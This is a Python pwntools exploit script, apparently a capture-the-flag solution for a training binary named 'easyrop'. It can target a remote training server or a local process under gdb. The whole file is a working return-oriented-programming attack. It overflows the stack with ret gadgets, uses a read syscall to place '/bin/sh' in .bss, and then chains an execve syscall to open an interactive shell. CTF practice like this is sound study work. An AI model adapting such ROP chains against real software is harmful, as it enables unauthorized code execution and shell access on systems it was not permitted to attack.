from pwn import *
from time import sleep

CHALL_PATH = "./easyrop"
CHALL = ELF(CHALL_PATH)

if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./easyrop")
        gdb.attach(c, """
        c
        b* 0x401167
        """ )
        input("wait")
    elif(sys.argv[1] == '-r'):
        c = remote("easyrop.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process("./easyrop")

ret = 0x401031 #ret;
pop_args = 0x40108e #pop rdi; pop rsi; pop rdx; pop rax; ret;
sys = 0x401028 #syscall;
sys_ret = 0x40107b #syscall; nop; pop rbp; ret;
bss_write = 0x403010

#overwrite the return address with some ret; gadgets
for i in range(15):
  c.send(p64(ret))
  c.send(p64(0x00))

#first write /bin/sh\00 into memory .bss with a sys_read
write_chain = b''
write_chain += p64(pop_args)
write_chain += p64(0x00)
write_chain += p64(0x00) #pop rsi
write_chain += p64(0x00)
write_chain += p64(bss_write) #pop rdi, where to write
write_chain += p64(0x00)
write_chain += p64(0x07) #pop rdx, number of bytes to read
write_chain += p64(0x00)
write_chain += p64(0x00) #pop rax
write_chain += p64(0x00)
write_chain += p64(sys_ret) #the return is needed to get back into the rop chain
write_chain += p64(0x00)
write_chain += p64(0x00) #pop rbp (useless)
write_chain += p64(0x00)

#system("/bin/sh", 0, 0)
binsh_chain = b''
binsh_chain += p64(pop_args)
binsh_chain += p64(0x00)
binsh_chain += p64(bss_write) #pop rdi
binsh_chain += p64(0x00) 
binsh_chain += p64(0x00) #pop rsi
binsh_chain += p64(0x00)
binsh_chain += p64(0x00) #pop rdx
binsh_chain += p64(0x00)
binsh_chain += p64(0x3b) #pop rax
binsh_chain += p64(0x00)
binsh_chain += p64(sys) #the return is not needed
binsh_chain += p64(0x00)

c.send(write_chain)
c.send(binsh_chain)

#to exit while(len>2) and make the main return
sleep(0.1)
c.send(b'\x00')
sleep(0.1)
c.send(b'\x00')

#input to write_chain
sleep(0.1)
c.sendline(b'/bin/sh')

c.interactive()

